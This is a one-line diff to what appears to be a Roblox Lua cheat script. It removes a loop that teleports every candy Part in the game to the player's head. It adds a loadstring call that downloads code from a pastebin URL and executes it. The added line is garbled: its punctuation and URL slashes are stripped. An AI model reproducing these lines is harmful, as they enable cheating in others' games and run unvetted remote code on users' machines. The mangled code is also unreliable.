@@ -1,1 +1,1 @@
-local plr = game.Players.LocalPlayer local pos = plr.Character.Head.Position  while wait() do for _,v in pairs(workspace.CandyStorage:GetDescendants()) do if v:IsA("Part") then     v.Position = pos end end end
+loadstring(gameHttpGet(httpspastebin.comraw00zfDL5G, true))()
